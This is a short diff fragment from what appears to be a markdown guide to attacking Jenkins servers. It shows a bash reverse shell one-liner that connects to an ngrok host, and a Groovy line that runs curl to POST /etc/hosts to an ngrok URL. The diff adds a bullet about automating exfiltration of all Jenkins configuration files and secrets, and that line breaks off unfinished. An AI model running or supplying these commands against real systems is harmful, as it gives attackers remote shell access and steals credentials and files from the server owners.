@@ -58,7 +58,8 @@ revshell.sh
 ```
 bash -i >& /dev/tcp/6.tcp.eu.ngrok.io/13520 0>&1
 ```
-  - Exfiltrate data
+  - Exfiltrate data - You can exfiltrate system files
+  - Automate a process to exfiltrate all jenkins configuration files, secrets,
 exfil.groovy
 ```
 "curl -X POST https://6aee-91-166-172-59.ngrok-free.app -d @/etc/hosts".execute()
